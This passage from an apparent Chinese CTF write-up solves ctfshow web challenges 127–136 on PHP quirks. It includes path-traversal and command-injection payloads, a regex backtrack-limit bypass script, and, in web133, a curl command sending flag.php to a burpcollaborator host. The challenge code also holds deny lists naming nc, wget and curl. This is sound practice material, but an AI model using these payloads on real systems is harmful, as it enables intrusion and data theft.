class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"嗯哼？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf_show</span><span class="token operator">===</span><span class="token string">'ilove36d'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-array-extract.html" target="_blank" rel="noopener">extract(提取、抽取)函数</a>：通常情况结合数组使用</p><p>?ctf_show=ilove36d但是下划线被过滤了</p><p>自己写个fuzz脚本跑一下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\&lt;|\,|\>|\.|\\\|\//'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">129</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"未编码："</span><span class="token punctuation">.</span><span class="token variable">$num</span><span class="token punctuation">.</span><span class="token string">"   经过编码："</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是这里我们的目的是利用空格、点、左中括号、+来被自动转换为下划线，经过fuzz得到空格，但是不知道为什么我空格经过URL编码确是+，但是%20确实符合该题目</p><p><code>?ctf%20show=ilove36d</code></p><h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"嗯哼？"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[0-9]|[a-z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">NULL</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html" target="_blank" rel="noopener">gettext()</a>拓展函数的用法</strong>：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">_</span><span class="token punctuation">(</span><span class="token punctuation">)</span>是<span class="token function">gettext</span><span class="token punctuation">(</span><span class="token punctuation">)</span>的拓展函数在开启相关设定后，<span class="token function">_</span><span class="token punctuation">(</span><span class="token string">"666"</span><span class="token punctuation">)</span>等价于<span class="token function">gettext</span><span class="token punctuation">(</span><span class="token string">"666"</span><span class="token punctuation">)</span>，且就返回其中的参数<span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">gettext</span><span class="token punctuation">(</span><span class="token number">666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//输出 666</span><span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">_</span><span class="token punctuation">(</span><span class="token string">"666"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//输出 666</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/php-get_defined_vars-function.html" target="_blank" rel="noopener">get_defined_vars()函数</a>：返回由所有已定义变量所组成的数组 ，very顾名思义</p><p>因为$flag属于是被定义变量的范畴，所以利用<code>?f1=_&amp;f2=get_defined_vars</code></p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span>_<span class="token punctuation">,</span><span class="token string">'get_defined_vars'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span>get_defined_vars<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span>get_defined_vars<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string">'ctfshow'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-filesystem-readfile.html" target="_blank" rel="noopener">readfile()函数</a>：<code>?f=/ctfshow/../../../../../../../var/www/html/flag.php</code>直接读就完事了</p><h2 id="web130、web131"><a href="#web130、web131" class="headerlink" title="web130、web131"></a>web130、web131</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string">'ctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="php特性："><a href="#php特性：" class="headerlink" title="php特性："></a>php特性：</h3><p>preg_match不识别数组，否则返回false，匹配一次返回1，没有返回0</p><p>if(0 === flase)返回值为false0不是强等于false的</p><p>stripos()函数对数组不识别，遇到数组会返回false</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>payload：<code>?f=ctfshow[]</code></p><h3 id="方法二：-1"><a href="#方法二：-1" class="headerlink" title="方法二："></a>方法二：</h3><p>采用<code>数组</code>绕过的方法，<code>stripos函数</code>会返回<code>null</code>,<code>null!=false</code>,所以可以绕过stripos函数</p><p><code>?f[]=666</code></p><h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p><strong>p神</strong>：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><p>溢出回溯限制</p><p>利用脚本：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://.ctf.show:8080/"</span>data<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">'f'</span><span class="token punctuation">:</span><span class="token string">'very'</span><span class="token operator">*</span><span class="token number">250000</span><span class="token operator">+</span><span class="token string">'ctfshow'</span><span class="token punctuation">}</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><p>首先打开是一个网页，御剑扫一下有robots.txt和admin/index.php</p><p>打开admin/index.php得到源码</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">===</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x36D</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">===</span> <span class="token variable">$flag</span> <span class="token operator">||</span> <span class="token variable">$username</span> <span class="token operator">===</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先是进行了强类型转换，作用未知，继续往下审</p><p><a href="https://www.runoob.com/php/func-math-mt-rand.html" target="_blank" rel="noopener">PHP mt_rand() 函数</a>：使用 Mersenne Twister 算法生成随机整数。相比较于rand()函数其速度更快</p><p><code>&amp;&amp;</code>：需要前面和后面的条件都为true，才会返回true</p><p><code>||</code>：只需要满足其中任意一个就行了</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">&amp;&amp;</span> <span class="token boolean">false</span> <span class="token operator">||</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"true!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"false!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//返回结果为true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以只需要满足后者就行：<code>$username ===&quot;admin&quot;</code></p><p>同时满足下一个if：<code>$code == &#39;admin&#39;</code></p><p>当然还有第一个if需要满足</p><h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/system|nc|wget|exec|passthru|netcat/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"6个字母都还不够呀?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来的意思有点套娃的意思</p><pre><code>$_GET[&#39;F&#39;]=`$F` ;ls;eval(substr($F,0,6))=eval(`$F` ;)$f=$_GET[&#39;F&#39;]=`$F` ;ls; eval(`$F` ;)= eval(``$F` ;ls;`) 可以利用sleep函数验证</code></pre><p>但是无回显，属于无回显RCE</p><p>这里的wp是利用curl来实现flag.php的外带</p><pre class="line-numbers language-php"><code class="language-php">payload<span class="token punctuation">:</span><span class="token operator">?</span>F<span class="token operator">=</span>`<span class="token variable">$F</span> `<span class="token punctuation">;</span><span class="token operator">+</span>curl <span class="token operator">-</span>X <span class="token constant">POST</span> <span class="token operator">-</span>F xx<span class="token operator">=</span>@flag<span class="token punctuation">.</span>php 6hokugw3tjr8vdj8f2yldiead1jt7i<span class="token punctuation">.</span>burpcollaborator<span class="token punctuation">.</span>net<span class="token shell-comment comment"># -X POST  指定 HTTP 请求的方法为 POST</span><span class="token shell-comment comment"># 其中-F 是带文件的形式发送post请求</span><span class="token shell-comment comment"># xx是上传文件的name值，flag.php就是上传的文件 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html" target="_blank" rel="noopener">curl 的参数用法</a></p><p><a href="https://requestbin.net/" target="_blank" rel="noopener">在线工具</a>(没用明白)</p><p><a href="https://blog.csdn.net/qq_46091464/article/details/109095382" target="_blank" rel="noopener">利用burpsuite</a></p><p>不错不错很好，学到一招面对无回显rce</p><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"nonononono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>@<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">==</span> <span class="token string">'36d'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span> <span class="token operator">==</span> <span class="token string">'36d'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/qq_49480008/article/details/115872899" target="_blank" rel="noopener">$_SERVER[‘QUERY_STRING’]解释</a></p><p><a href="https://www.w3school.com.cn/php/func_array_extract.asp" target="_blank" rel="noopener">PHP extract() 函数</a></p><p>payload：<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"师傅们居然破解了前面的，那就来一个加强版吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此次利用没有了curl，利用的是<a href="https://www.runoob.com/linux/linux-comm-cp.html" target="_blank" rel="noopener">cp命令</a></p><pre><code>?F=`$F` ;cp flag.php 666.txt?F=`$F` ;nl flag.php&gt;666.txt?F=`$F` ;mv flag.php 666.txt</code></pre><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\{|\}|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/jjlovefj/article/details/83176871" target="_blank" rel="noopener">Linux tee命令</a></p><pre class="line-numbers language-php"><code class="language-php">常见用例： tee file <span class="token comment" spellcheck="true">//覆盖</span>tee <span class="token operator">-</span>a file <span class="token 